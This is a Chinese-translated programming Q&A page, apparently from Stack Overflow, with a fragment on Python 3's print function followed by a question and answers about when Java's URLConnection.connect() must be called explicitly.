在 Python 3.x 中，`print`现在是一个函数，而不是关键字，因此您必须更改所有行，例如...

```
print data 
```

...至...

```
print(data) 
```

如果您需要保留 Python 2.x 兼容性，请添加以下行...

```
from __future__ import print_function 
```

...在代码的顶部。

# java - Java URLConnection - 我什么时候需要使用 connect() 方法？

> ID：16122999
> 
> 赞同：36
> 
> 时间：2013-04-20T17:10:13.430
> 
> 标签：java, connect, httpurlconnection, urlconnection

我在理解类中`connect()`方法的含义时遇到了问题`URLConnection`。在下面的代码中，如果我使用该`connect()`方法，如果我不使用它，我会得到相同的结果。

为什么（或何时）需要使用它？

```
URL u = new URL("http://example.com");
HttpURLConnection conn = (HttpURLConnection) u.openConnection();

conn.connect();//with or without it I have the same result

InputStream in = conn.getInputStream();
int b;
while ((b = in.read()) != -1) {
 System.out.write(b);
} 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2014-05-14T00:44:11.763

```
HttpURLConnection conn = (HttpURLConnection) u.openConnection(); 
```

只创建一个对象

`connect()`方法被调用`conn.getInputStream();`

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2013-09-11T13:07:39.423

您并不总是需要显式调用 connect 方法来启动连接。

如有必要，依赖于连接的操作（如`getInputStream`、`getOutputStream`等）将隐式执行连接。

这是oracle文档[链接](http://docs.oracle.com/javase/tutorial/networking/urls/connecting.html)